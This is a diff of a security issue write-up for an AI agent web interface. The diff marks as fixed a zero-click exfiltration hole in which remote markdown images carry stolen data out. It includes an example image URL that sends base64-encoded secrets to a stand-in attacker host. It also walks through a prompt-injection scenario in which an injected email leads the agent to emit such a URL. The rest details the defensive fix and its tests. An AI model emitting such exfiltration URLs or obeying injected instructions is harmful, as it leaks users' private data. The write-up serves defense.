@@ -1,24 +1,24 @@
 # Cockpit renders agent markdown with remote `<img>` allowed — a zero-click data-exfiltration channel for prompt injection
 
-**Status:** **DIAGNOSED via code audit + industry precedent, 2026-07-15. Not yet browser-reproduced; no fix yet.** The render path, the permissive sanitizer posture, and the absence of an `img-src` CSP are all confirmed in code (refs below). A 2-minute empirical probe (below) will confirm the live zero-click fetch — but the fix is warranted either way (defense-in-depth against a well-documented attack class).
+**Status:** **FIXED IN SOURCE + VERIFIED, 2026-07-17; deployment still required.** The pre-fix render path, permissive sanitizer posture, and missing `img-src` CSP were confirmed by code audit. The implemented fix preserves useful images without retaining the zero-click channel: every markdown image becomes an inert URL-review card and can be fetched only after an explicit per-image user action through an authenticated, SSRF-hardened backend. A platform `img-src 'self' blob: data:` CSP is the fail-closed backstop (`data:` preserves existing local file previews and cannot contact a remote origin). Unit, integration, real-network smoke, and Chromium/Firefox browser probes pass; the local host lacks the OS libraries required to launch Playwright WebKit.
 **Found:** 2026-07-15, during the email-datasource research pass ([[project-email-datasource]] / `docs/features/email_datasource.md` "Security posture"). This is a **pre-existing, feature-independent platform vulnerability** — it exists today for any untrusted content the agent already ingests (web_search results, repo files, tool output). The email datasource does not create it; it makes it **acute** by adding the canonical injection source (an attacker-controlled inbox).
 **Severity:** **High.** Zero-click exfiltration of anything in the agent's context window (other emails, datasource rows, repo/workspace files, KB/memory) to an attacker-controlled URL, triggered by a prompt injection in any untrusted content the agent summarizes or quotes. No user interaction beyond viewing the agent's reply. This is the exact mechanism behind Microsoft 365 Copilot **EchoLeak** (CVE-2025-32711), ChatGPT **ShadowLeak**, and **Superhuman AI** (Jan 2026) — the product this project is named after.
-**Component:** cockpit Angular · `cockpit/src/app/app.config.ts:95-116` (`provideMarkdown()`) · `cockpit/src/app/views/persistent-chat/persistent-chat.component.ts:807,862,965,1007,1024` (`<markdown [data]=…>` render sites) · `docker/cockpit-nginx.conf:9` + `cockpit/angular.json:113` (app CSP = `frame-ancestors 'none'` only) · **in-repo fix precedent:** `cockpit/src/app/views/canvas/canvas-rendering.ts:1,47,400,508` (DOMPurify + strict CSP)
+**Component:** cockpit Angular · `cockpit/src/app/core/markdown/external-image-extension.ts` · `cockpit/src/app/core/markdown/markdown-sanitizer.ts` · `cockpit/src/app/ui/external-image/external-image.directive.ts` · `cockpit/src/app/app.config.ts` · orchestrator `POST /api/media/remote-image` + `orchestrator/services/remote_image.py` · `docker/cockpit-nginx.conf` + `cockpit/angular.json`
 **Related:** [[project-email-datasource]] (the doc that flagged this; its P0 "output-side egress control") · the draft-sanitization sibling concern (an agent-composed draft body with a tracking pixel fires when the user opens it to review — same channel, mail-client side)
 
 ## Summary
 
-The cockpit renders assistant/agent message content as markdown via `ngx-markdown`, which relies on Angular's default `DomSanitizer`. That sanitizer strips scripts and event handlers but **permits `<img src="https://…">`**. Agent output is untrusted the moment the agent has read any untrusted input (an email body, a web page, a repo file). So an injected instruction that makes the model emit:
+Before this fix, the cockpit rendered assistant/agent message content as markdown via `ngx-markdown`, relying on Angular's default `DomSanitizer`. That sanitizer strips scripts and event handlers but **permits `<img src="https://…">`**. Agent output is untrusted the moment the agent has read any untrusted input (an email body, a web page, a repo file). So an injected instruction that made the model emit:
 
 ```markdown
 ![](https://attacker.example/x?d=<base64 of secrets the agent just read>)
 ```
 
-renders an `<img>` whose `src` the browser **auto-fetches with zero clicks**, delivering the exfiltrated data in the URL. The app ships no `img-src`/`connect-src` Content-Security-Policy to stop the fetch (the only CSP is `frame-ancestors 'none'`, which addresses clickjacking, not egress).
+rendered an `<img>` whose `src` the browser **auto-fetched with zero clicks**, delivering the exfiltrated data in the URL. The pre-fix app shipped no `img-src` Content-Security-Policy to stop the fetch (the only CSP was `frame-ancestors 'none'`, which addresses clickjacking, not egress).
 
 This is the completing leg of the **lethal trifecta** (private data + untrusted content + external communication): tier gating, folder allowlists, and "draft-not-send" defenses in the email design are all orthogonal to it — read access plus a rendering surface is already a full exfil path.
 
-## The vulnerability, in code
+## The pre-fix vulnerability, in code
 
 **1. Untrusted agent content is rendered as markdown.** Every assistant turn, summary, and answer flows through `<markdown [data]=…>`:
 
@@ -72,9 +72,9 @@ The team already knows how to neutralize external-resource loading in untrusted 
 3. The injection instructs the model to base64 the content of the other messages it read and emit a markdown image `![](https://attacker/collect?d=<data>)`.
 4. The cockpit renders the reply; the browser fetches the URL **zero-click**; the attacker's endpoint logs the query string. Done.
 
-The same works **today**, pre-email, with any untrusted content the agent ingests (a web_search result page, a poisoned repo README). Email just guarantees a steady supply of attacker-controlled input.
+The same path worked pre-email with any untrusted content the agent ingested (a web_search result page, a poisoned repo README). Email merely guarantees a steady supply of attacker-controlled input.
 
-## Proposed fix
+## Fix strategy
 
 Two complementary layers; do both.
 
@@ -87,11 +87,25 @@ Both are informed by the production fixes that actually stopped EchoLeak-class a
 
 Related hardening tracked in the email doc, not here: draft-body sanitization before IMAP `APPEND`, and the approval/preview UI rendering previews with images blocked + URLs expanded.
 
+## Approved implementation design (2026-07-17)
+
+The product decision is to retain images behind **per-image informed consent**. There is deliberately no host allowlist or "always allow this domain" state: an attacker can encode data in a URL on an otherwise trusted host, so approval must apply to the exact URL the user can inspect.
+
+1. **Neutralize before DOM insertion.** A global `marked` image renderer converts inline and reference-style markdown images into inert placeholders containing the escaped URL and alt text. It never emits `<img>`. The ngx-markdown sanitizer is replaced with DOMPurify configured to reject raw HTML resource-loading paths (`img`, `picture`, `source`, media/embed tags, SVG, `style`, and resource URL/style attributes). This ordering matters: replacing an `<img>` after it reaches the DOM is too late because the browser may already have started the request.
+2. **Show a review card.** Every current Cockpit markdown surface enhances the inert placeholder into a card that shows the complete URL, identifies the destination host, warns when URL parameters are present, and offers **Copy URL** and **Load image once**. Merely rendering the card performs no network request.
+3. **Fetch only after the click.** **Load image once** sends the exact reviewed URL in an authenticated, CSRF-protected POST to the orchestrator. The browser never assigns the remote URL to an element. The orchestrator accepts only public HTTPS destinations on port 443, rejects credentials and private/reserved/link-local IPs, validates and pins DNS results for the connection, re-applies the policy to every bounded redirect, sends no user cookies/referrer/auth headers, enforces time/byte/pixel limits, and accepts only verified raster image formats (no SVG/HTML). The returned bytes are displayed from a browser-memory `blob:` URL and revoked when the markdown rerenders or is destroyed.
+4. **Keep a platform backstop.** The Cockpit document CSP becomes `frame-ancestors 'none'; img-src 'self' blob: data:`. App assets, browser-memory blobs, and existing local data-URL file previews continue to work, while any future missed remote `<img>` fails closed at the browser boundary. `data:` cannot create the outbound request this issue is about, and untrusted Markdown is independently forbidden from supplying image/resource elements or inline styles.
+
+The proxy response is intentionally `private, no-store`; no remote URL, response, or approval is persisted server-side. "Once" means one explicit fetch for that rendered card, not a durable trust decision.
+
 ## Verification
 
-- **Confirm the live hole (2 minutes):** have an agent emit `![](https://<your-collaborator-or-logging-endpoint>/probe)` in a reply (or paste it into a rendered markdown surface) and watch for the inbound hit in DevTools Network / the collaborator log. A hit confirms zero-click fetch; the fix must make it stop.
-- **Post-fix:** the same probe produces **no** outbound request (render path strips it) and/or is **blocked by CSP** (console `Refused to load the image … violates the Content Security Policy directive "img-src …"`). Add a cockpit unit/e2e test asserting a remote `<img>` in agent markdown does not load, mirroring the canvas conformance tests (`cockpit/e2e/canvas/canvas-conformance.spec.ts`).
+- **Parser/sanitizer/card integration:** inline and reference-style images become inert placeholders; raw `<img>`, media, SVG, `src`/`srcset` and CSS URL paths are stripped; rendering a reviewed card makes zero HTTP requests; clicking sends the exact URL once and renders only the returned `blob:`. Covered by the new Cockpit specs; the complete Vitest run passes (91 files / 1,175 tests).
+- **Backend security boundary:** URL/IP policy, mixed public/private DNS answers, connection pinning, unsafe redirects, declared/streamed size limits, raster decoding, auth-before-fetch, and no-store/nosniff response headers are covered by `tests/test_remote_image.py` (33 cases). The endpoint inventory classifies the new route as `gated:require_approved_user`.
+- **Browser backstop:** the production-browser conformance suite injects a hostile remote `<img>` into the trusted parent document and observes the image error with **zero outbound requests**. All 20 Chromium/Firefox cases pass. WebKit was not runnable locally because the host lacks `libicu74` and `libjpeg-turbo8`.
+- **Real fetch smoke:** the hardened fetcher resolved, downloaded, decoded, and identified Google's public 272×92 PNG (`image/png`, 5,969 bytes).
+- **After deployment:** repeat the original collaborator probe through an actual agent reply. It should show the review card with no hit; a hit should occur only after **Load image once**. This is the remaining deployment-level confirmation, not an unresolved source-code question.
 
 ## Scope / priority
 
-Independent of the email datasource and worth fixing on its own merits — it protects every existing untrusted-content path (web_search, repo, tool output). It is a **hard prerequisite for the email draft/send tiers** but the email **read tier can ship alongside** it. Recommend prioritizing the platform CSP (cheap, broad) immediately and the render-path sanitization as the durable fix.
+Independent of the email datasource and worth fixing on its own merits — it protects every existing untrusted-content path (web_search, repo, tool output). Once this source change is deployed, the Cockpit-side prerequisite for the email draft/send tiers is satisfied. Mail-client draft-body sanitization remains a separate requirement tracked in the email design.
